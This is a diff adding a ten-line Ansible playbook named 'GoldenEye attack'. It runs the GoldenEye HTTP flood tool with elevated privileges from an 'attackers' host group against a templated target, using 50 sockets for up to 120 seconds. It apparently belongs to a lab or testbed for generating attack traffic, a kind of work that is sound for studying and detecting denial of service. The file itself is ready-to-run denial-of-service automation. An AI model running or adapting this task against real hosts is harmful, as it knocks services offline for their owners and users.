@@ -1,0 +1,10 @@
+---
+- name: GoldenEye attack
+  hosts: attackers
+  gather_facts: false
+  become: true
+
+  tasks:
+    - name: Run GoldenEye (HTTP flood)
+      shell: "timeout {{ [duration | int, 120] | min }}s /opt/goldeneye/goldeneye.py {{ target }} -s 50"
+      ignore_errors: true
